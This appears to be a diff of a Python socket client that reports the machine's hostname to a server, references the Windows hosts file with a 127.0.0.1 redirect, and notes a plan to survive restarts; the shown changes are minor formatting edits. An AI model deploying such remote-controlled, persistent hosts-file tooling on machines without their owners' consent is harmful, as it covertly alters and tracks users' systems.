@@ -8,7 +8,6 @@ window_host = r"C:\Windows\System32\drivers\etc\hosts"
 default_folder = window_host 
 redirect = "127.0.0.1"
 
-
 class Client():#To do :always on - turns on restart
     def __init__(self, port=8810, ip="0.0.0.0"):
         self.s = socket.socket()
@@ -16,7 +15,7 @@ class Client():#To do :always on - turns on restart
         print("connected")# to be deleted     
     
     def first_message(self):
-        self.s.send(socket.gethostname().encode())
+        self.s.send(f"name:{socket.gethostname()}".encode())
         
     def info(self):
         pass
@@ -42,7 +41,6 @@ class Client():#To do :always on - turns on restart
             time.sleep(3)
 
 def main():
-   client = Client()
-    
+   client = Client()   
 if __name__ == "__main__":
     main()
